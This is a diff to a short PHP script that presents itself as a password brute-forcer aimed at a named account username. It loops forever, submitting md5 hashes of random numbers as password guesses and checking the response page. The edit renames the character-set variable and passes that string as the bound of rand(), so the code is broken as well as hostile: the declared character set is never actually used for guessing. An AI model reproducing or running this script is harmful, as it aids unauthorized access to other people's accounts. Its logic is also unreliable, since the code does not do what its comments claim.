@@ -5,16 +5,16 @@ global $startpagina;
 $time = microtime() * 100000;
 $username = "kenkensquidkuddlephish";
 echo "https://twitter.com/LizardL4nds";
-$Pass = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
-$c_len = strlen($Pass); 
+$Pass1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ01234567890!@#$%&*';          /*character set which is used to brute force the password*/
+$c_len = strlen($Pass1); 
 $c_len--;
 $min = 1;
 $max = 12;
-function bruteForce($Pass)
+function bruteForce($Pass1)
 {
 while(True)
 {     
-	$Pass = md5(rand(0, 1000000));
+	$Pass = md5(rand(0, $Pass1));
 
 	check_correct($Pass);
    }
@@ -35,6 +35,6 @@ function check_correct($Pass)
 	if($str != "Startpagina") {return $Pass;}
         else {return false;}
 }
-bruteForce($Pass);
+bruteForce($Pass1);
 echo "NO PASSWORD FOUND"; 
 ?>
